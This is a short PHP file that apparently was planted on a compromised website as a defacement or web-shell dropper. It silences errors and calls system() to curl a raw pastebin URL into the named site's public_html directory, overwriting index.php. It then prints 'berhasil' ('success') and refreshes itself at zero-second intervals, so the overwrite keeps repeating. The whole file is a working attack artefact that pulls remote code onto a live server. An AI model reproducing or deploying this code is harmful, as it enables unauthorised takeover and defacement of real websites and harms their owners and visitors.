<?php error_reporting(0);ini_set('display_errors', FALSE);

system("cd /home/ccusiorg/public_html/usi.org.in;curl https://pastebin.com/raw/E3HhTxsH -o index.php");?>
berhasil
<?php
$page = $_SERVER['PHP_SELF'];
$sec = "0";
?>
<html>
    <head>
    <meta http-equiv="refresh" content="<?php echo $sec?>;URL='<?php echo $page?>'">
    </head>
    <body>
    <?php
        
    ?>
    </body>
</html>
